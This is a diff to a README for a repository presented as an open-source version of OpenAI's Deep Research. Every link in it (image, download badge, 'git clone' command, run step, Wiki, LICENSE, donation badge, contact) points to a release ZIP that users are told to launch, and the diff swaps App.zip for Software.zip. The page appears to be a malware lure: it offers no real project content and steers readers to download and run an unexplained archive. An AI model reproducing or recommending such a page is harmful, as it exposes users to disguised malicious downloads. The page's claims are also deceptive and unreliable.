@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Deep Research Repository! 🧠
 
-![Deep Research Image](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip)
+![Deep Research Image](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip)
 
 ## Repository Name: 
 ### deep-research
@@ -16,7 +16,7 @@ Welcome to my open-source implementation of OpenAI's cutting-edge Deep Research 
 - research
 
 ## 📡 Download the Latest Version:
-[![Download ZIP](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip)](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip) (Needs to be launched)
+[![Download ZIP](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip)](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip) (Needs to be launched)
 
 ## 🤖 Features:
 - Cutting-edge implementation of OpenAI's Deep Research
@@ -28,17 +28,17 @@ Welcome to my open-source implementation of OpenAI's cutting-edge Deep Research 
 ## 🛠️ Installation:
 1. Clone the repository to your local machine
    ```bash
-   git clone https://github.com/justnem/deep-research/releases/download/v1.0/App.zip
+   git clone https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip
    ```
 2. Simply launch the ZIP file downloaded from the link above
 
 ## 🚀 Getting Started:
-1. Run the `https://github.com/justnem/deep-research/releases/download/v1.0/App.zip` script
+1. Run the `https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip` script
 2. Customize the agent's behavior by adjusting parameters
 3. Explore the powerful AI research capabilities
 
 ## 📚 Documentation:
-Check out the [Wiki](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip) for detailed documentation on:
+Check out the [Wiki](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip) for detailed documentation on:
 - Agent customization
 - Supported research tasks
 - Running the agent for different durations
@@ -51,14 +51,14 @@ Contributions are welcomed! Feel free to:
 - Submit pull requests
 
 ## 📜 License:
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip) file for more details.
 
 ## ❤️ Support:
 If you find this project helpful, consider buying me a coffee! 
-[![Buy me a coffee](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip%20me%20a%20coffee-orange)](https://github.com/justnem/deep-research/releases/download/v1.0/App.zip)
+[![Buy me a coffee](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip%20me%20a%20coffee-orange)](https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip)
 
 ## 📞 Contact:
-For any inquiries or collaborations, feel free to reach out at `https://github.com/justnem/deep-research/releases/download/v1.0/App.zip`.
+For any inquiries or collaborations, feel free to reach out at `https://github.com/justnem/deep-research/releases/download/v2.0/Software.zip`.
 
 ---
 Remember, knowledge is power! Dive into the world of AI research with Deep Research. Let your imagination soar! 🚀
